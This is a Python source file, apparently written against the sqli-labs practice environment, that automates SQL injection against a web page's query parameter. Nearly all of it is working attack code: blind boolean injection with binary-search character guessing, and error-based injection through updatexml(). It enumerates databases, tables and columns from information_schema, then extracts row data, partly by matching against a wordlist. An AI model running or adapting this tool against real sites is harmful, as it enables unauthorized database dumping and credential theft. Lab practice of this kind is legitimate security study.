import time,requests
from urllib import request
from bs4 import BeautifulSoup
import re


def log(content):
    this_time = time.strftime('%H:%M:%S', time.localtime(time.time()))
    print('[' + str(this_time) + '] ' + content)


def send_request(url):
    log(url)
    res = request.urlopen(url)
    result = str(res.read().decode('utf-8'))
    return result



def get_prefix_url(url):
    splits = url.split('=')
    splits.remove(splits[-1])
    prefix_url = ''
    for item in splits:
        prefix_url += str(item)
    return prefix_url

def blind_inject_databse_length(url,symbol):
    prefix_url = get_prefix_url(url)
    length1 = len(requests.get(url).text)
    test_url = prefix_url + '=1' + symbol + 'and%20length(database())>{0}--+'
    for i in range(20):#数据库名称长度最多20
        test = test_url.format(i)
        log(test)
        length2 = len(requests.get(test).text)
        if length2 != length1:
            return i

def blind_inject_database_ascii(url,symbol,count):
    prefix_url = get_prefix_url(url)
    length1 = len(requests.get(url).text)
    guess_list = [i for i in range(46, 123)]  # 范围1-100范围要比要猜的数字要大

    while 1:
        min_number = min(guess_list)  # 最小数
        max_number = max(guess_list)  # 最大数
        mid_number = (max_number + min_number) // 2  # 中间数
        test_url= prefix_url+'=1'+symbol+'and%20ORD(mid(database(),'+str(count)+',1))>'+str(mid_number)+'--+'
        print(test_url)
        length2 = len(requests.get(test_url).text)
        if length2 == length1:
            guess_list = [i for i in range(mid_number, max_number + 1)]
            if len(guess_list) == 2:
                for i in guess_list:
                    test= prefix_url+'=1'+symbol+'and%20ORD(mid(database(),'+str(count)+',1))>'+str(i)+'--+'
                    length3 = len(requests.get(test).text)
                    if length1 != length3:
                        return i
        else:
            guess_list = [i for i in range(min_number, mid_number + 1)]

def blind_inject_database(url,symbol):
    length = blind_inject_databse_length(url,symbol)
    data = ''
    for i in range(1,length+1):
        #test_url = prefix_url + '=1' + symbol + 'and%20ORD(mid(database(),2,1))>' + str(mid_number) + '--+'
        data = data + chr(blind_inject_database_ascii(url,symbol,i))
    return data



#判断第一个表字段的长度
def blind_inject_table_length(url,symbol,count,database):
    prefix_url = get_prefix_url(url)
    test_url = prefix_url + '=1' + symbol + 'and%20length((select%20table_name%20from%20information_schema.tables%20where%20table_schema="'+database+'"%20limit%20'+str(count)+',1))%20>'

    for i in range(25):
        test_url = test_url + str(i) + '--+'
        result = send_request(test_url)
        soup = BeautifulSoup(result, 'html.parser')
        fonts = soup.find_all('font')
        content = str(fonts[2].text)
        test_url = prefix_url + '=1' + symbol + 'and%20length((select%20table_name%20from%20information_schema.tables%20where%20table_schema="'+database+'"%20limit%20'+str(count)+',1))%20>'
        if(content) == '':
            return i

#判断几个字段的长度
def blind_table_name_length(url,symbol,database):
    list = []
    for i in range(20):
        list.append(blind_inject_table_length(url,symbol,i,database))
        if blind_inject_table_length(url,symbol,i,database) == 0:
            list.pop()
            return list


#猜表的名字
def blind_table_name(url,symbol,data_count,table_count,database):
    prefix_url = get_prefix_url(url)
    length1 = len(requests.get(url).text)
    guess_list = [i for i in range(46, 123)]  # 范围1-100范围要比要猜的数字要大
    while 1:
        min_number = min(guess_list)  # 最小数
        max_number = max(guess_list)  # 最大数
        mid_number = (max_number + min_number) // 2  # 中间数
        test_url = prefix_url + '=1' + symbol + 'and ascii(substr((select table_name from information_schema.tables where table_schema="'+database+'" limit '+str(table_count)+',1),'+str(data_count)+',1))>'+str(mid_number)+'%23'
        length2 = len(requests.get(test_url).text)
        if length2 == length1:
            guess_url = prefix_url + '=1' + symbol + 'and ascii(substr((select table_name from information_schema.tables where table_schema="'+database+'" limit '+str(table_count)+',1),'+str(data_count)+',1))>'+str(mid_number)+')%23'
            log(guess_url)
            guess_list = [i for i in range(mid_number, max_number + 1)]
            if len(guess_list) ==2:
                for i in guess_list:
                    guess_url2 = prefix_url + '=1' + symbol + 'and ascii(substr((select table_name from information_schema.tables where table_schema="'+database+'" limit '+str(table_count)+',1)),'+str(data_count)+',1)>' + str(
                        i) + ')%23'
                    length3 = len(requests.get(guess_url2).text)
                    if length1 != length3:
                        return (i+1)
        else:
            guess_list = [i for i in range(min_number, mid_number + 1)]

#爆出表全部内容
def blind_table_data_ascii(url,symbol,database):
    list = []
    list1 = blind_table_name_length(url,symbol,database)
    for j in range(len(list1)):
        for i in range(1,list1[j]+1):
            list.append(blind_table_name(url,symbol,i,j,database))
        list.append('||')
    return list

def blind_table_data(url,symbol,database):
    list = blind_table_data_ascii(url,symbol,database)
    data = ''
    for i in list:
        if i == '||':
            data = data + i
        else:
            data = data + chr(i)
    if data == '':
        exit("不存在指定数据库")

    return data


#查看数据中有几个字段
def blind_data_field(url,symbol,database,table):
    prefix_url = get_prefix_url(url)
    for i in range(10):
        test_url = prefix_url + '=1' + symbol + 'and%20length((select%20column_name%20from%20information_schema.columns%20where%20table_name%20=%20"'+table+'"%20and%20TABLE_SCHEMA="'+database+'"%20limit%20' + str(
        i) + ',1))>'
        test_url = test_url + str(i) + '--+'
        result = send_request(test_url)
        soup = BeautifulSoup(result, 'html.parser')
        fonts = soup.find_all('font')
        content = str(fonts[2].text)
        if (content) == '':
            return i


#查看字段的长度
def blind_field_length(url,symbol,count,database,table):
    prefix_url = get_prefix_url(url)
    test_url = prefix_url + '=1' + symbol + 'and%20length((select%20column_name%20from%20information_schema.columns%20where%20table_name%20=%20"'+table+'"%20and%20TABLE_SCHEMA="'+database+'"%20limit%20'+str(count)+',1))>'
    for i in range(20):#列名最大为20个字符
        test_url = test_url + str(i) + '--+'
        result = send_request(test_url)
        soup = BeautifulSoup(result, 'html.parser')
        fonts = soup.find_all('font')
        content = str(fonts[2].text)
        test_url = prefix_url + '=1' + symbol + 'and%20length((select%20column_name%20from%20information_schema.columns%20where%20table_name%20=%20"'+table+'"%20and%20TABLE_SCHEMA="'+database+'"%20limit%20'+str(count)+',1))>'
        if (content) == '':
            return i

#获取表中字段的长度
def blind_table_field_length(url,symbol,database,table):
    list = []
    for i in range(blind_data_field(url,symbol,database,table)):
        list.append(blind_field_length(url,symbol,i,database,table))
    return list

#获取id等字段数据
def blind_table_field_data(url,symbol,length,count,database,table):
    prefix_url = get_prefix_url(url)
    length1 = len(requests.get(url).text)
    guess_list = [i for i in range(46, 123)]  # 范围1-100范围要比要猜的数字要大
    while 1:
        min_number = min(guess_list)  # 最小数
        max_number = max(guess_list)  # 最大数
        mid_number = (max_number + min_number) // 2  # 中间数
        test_url = prefix_url + '=1' + symbol + 'and ascii(substr((select column_name from information_schema.columns where table_name="'+table+'" and TABLE_SCHEMA="'+database+'" limit ' + str(
            length) + ',1),' + str(count) + ',1))>' + str(mid_number) + '%23'

        length2 = len(requests.get(test_url).text)
        if length2 == length1:
            guess_url = prefix_url + '=1' + symbol + 'and ascii(substr((select column_name from information_schema.columns where table_name="'+table+'" and TABLE_SCHEMA="'+database+'" limit ' + str(
                length) + ',1),' + str(count) + ',1))>' + str(mid_number) + '%23'
            log(guess_url)
            guess_list = [i for i in range(mid_number, max_number + 1)]
            if len(guess_list) == 2:
                for i in guess_list:
                    guess_url2 = prefix_url + '=1' + symbol + 'and ascii(substr((select column_name from information_schema.columns where table_name="'+table+'" and TABLE_SCHEMA="'+database+'" limit ' + str(
                        length) + ',1),' + str(count) + ',1))>' + str(i) + '%23'
                    length3 = len(requests.get(guess_url2).text)
                    if length1 != length3:
                        return i
        else:
            guess_list = [i for i in range(min_number, mid_number + 1)]

def blind_table_field_data_ascii(url,symbol,database,table):
    list = []
    a = blind_table_field_length(url,symbol,database,table)
    for j in range(len(a)):
        for i in range(1,a[j]+1):
            list.append(blind_table_field_data(url,symbol,j,i,database,table))
        list.append('||')
    return list

def blind_table_field(url,symbol,database,table):
    list = blind_table_field_data_ascii(url,symbol,database,table)
    data = ""
    for i in list:
        if i != '||':
            data = data+chr(i)
        elif i =='||':
            data = data+'||'

    if data =='':
        exit('指定表错误')
    return data

def blind_data_length(url,symbol,table,field,data_count):
    list = []
    prefix_url = get_prefix_url(url)
    length1 = len(requests.get(url).text)
    test_url = prefix_url + '=1' + symbol + 'and ((select length('+field+') from '+table+' limit {0},1)>{1})--+'

    for i in range(0, data_count):  # 此靶场的数据较少所以写了十个
        for j in range(1, data_count):  # 获取users表中username字段中第i个数据的长度
            url = test_url.format(i, j)
            log(url)
            response = requests.get(url)
            length2 = len(response.text)
            if length1 != length2:
                if j != 1:
                    list.append(j)
                else:
                    pass
                break
    return list

#usernames = ["Dumb","Angelina","Dummy","secure","stupid","superman","batman","admin","admin1","admin2","admin3","dhakkan","admin4","1234"]
username = []
def open_dir(file):

    f = open(file, "r", encoding="gbk")
    for i in f.readlines():
        j=i.replace('\n', '')
        username.append(j)
    f.close()
    return username



def blind_data(url,symbol,table,field,data_count,dir_file):
    data = ""
    count = blind_data_length(url, symbol,table,field,data_count)
    length1 = len(requests.get(url).text)
    usernames = open_dir(dir_file)
    for i in range(len(count)):
        for user in usernames:
            url_template = url + symbol + "and ((select "+field+" from "+table+" limit "+str(i)+",1)='"+user+"') %23"
            print(url_template)
            response = requests.get(url_template)
            length2 = len(response.text)
            if length1 == length2:
                data = data+str(i+1)+"   "+user+"    " + '\n'
                break
    return (data)

def error_inject_all_database(url,symbol):
    data = ''
    prefix_url = get_prefix_url(url)
    test_url = prefix_url + '=1' + symbol +'%20and%20updatexml(1,concat(0x23,(select%20concat(SCHEMA_NAME)%20from%20information_schema.SCHEMATA%20limit%20{0},1),0x23),1)--+'
    for i in range(30):
        url = test_url.format(i)
        result = send_request(url)
        soup = BeautifulSoup(result, 'html.parser')
        fonts = soup.find_all('font')
        content = str(fonts[2].text)
        if "".join(re.findall(r".*#(.*)#", content)) == '':
            pass
        else:
            data = data + str(i + 1) + '   ' + "".join(re.findall(r".*#(.*)#", content)) + "   " + '\n'
    return data


#爆当前数据库
def error_inject_databse(url,symbol):
    list = []
    data = ''
    prefix_url = get_prefix_url(url)
    #这里的updatexml()就是回显的1,2,3位置
    test_url = prefix_url + '=1' + symbol + 'and%20updatexml(1,concat(0x7e,database()),1)'
    test_url = test_url + '--+'
    result = send_request(test_url)
    soup = BeautifulSoup(result, 'html.parser')
    fonts = soup.find_all('font')
    content = str(fonts[2].text)

    for i in range(len(content)):
        if content[i] == "'":
            list.append(i)

    for k in range(list[0]+1,list[len(list)-1]):
        data = data + content[k]

    return (data.replace('~',''))

#爆当前数据库的表信息
def error_database_table(url,symbol,database):
    list = []
    data = ''
    prefix_url = get_prefix_url(url)
    # 这里的updatexml()就是回显的1,2,3位置
    test_url = prefix_url + '=1' + symbol + "and%20updatexml(1,concat(0x7e,(select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema='"+database+"'),0x7e),1)"
    test_url = test_url + '--+'
    result = send_request(test_url)
    soup = BeautifulSoup(result, 'html.parser')
    fonts = soup.find_all('font')
    content = str(fonts[2].text)

    for i in range(len(content)):
        if content[i] == "'":
            list.append(i)

    print(content[22])
    for k in range(list[0] + 1, list[len(list) - 1]):
        data = data + content[k]

    return (data.replace('~',''))


#获取User表中各个字段的名称，但是User表已经指定，还有就是这三个报错注入的函数除了payload不同其他的东西都是一样的
def error_tables_field(url,symbol,database,table):
    list = []
    data = ''
    prefix_url = get_prefix_url(url)
    test_url = prefix_url + '=1' + symbol + "and%20updatexml(1,concat(0x7e,(select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_schema='"+database+"'%20and%20table_name='"+table+"'),0x7e),1)"
    test_url = test_url + '--+'
    result = send_request(test_url)
    soup = BeautifulSoup(result, 'html.parser')
    fonts = soup.find_all('font')
    content = str(fonts[2].text)

    for i in range(len(content)):
        if content[i] == "'":
            list.append(i)

    if list ==[]:
        exit("指定表错误")
    for k in range(list[0] + 1, list[len(list) - 1]):
        data = data + content[k]
    return (data.replace('~',''))


def error_get_data(url,symbol,database,table,field,count):#count表示的是数据长度默认为50
    data = ""
    prefix_url = get_prefix_url(url)
    test_url = prefix_url + '=1' + symbol + 'and%20updatexml(1,concat(0x23,(select%20('+field+')%20from%20'+database+'.'+table+'%20limit%20{0},1),0x23),1)--+'
    for i in range(count):#这里的50是数据最大条数
        url = test_url.format(i)
        result = send_request(url)
        soup = BeautifulSoup(result, 'html.parser')
        fonts = soup.find_all('font')
        content = str(fonts[2].text)
        if "".join(re.findall(r".*#(.*)#",content)) =='':
            pass
        else:
            data = data +str(i+1)+'   '+ "".join(re.findall(r".*#(.*)#",content))+"   " +'\n'

    return data


# url = "http://192.168.22.139/sqli-labs-master/Less-1/?id=1"
# symbol = '%27'
# print(error_tables_field(url,symbol,database="test",table="dhsa"))


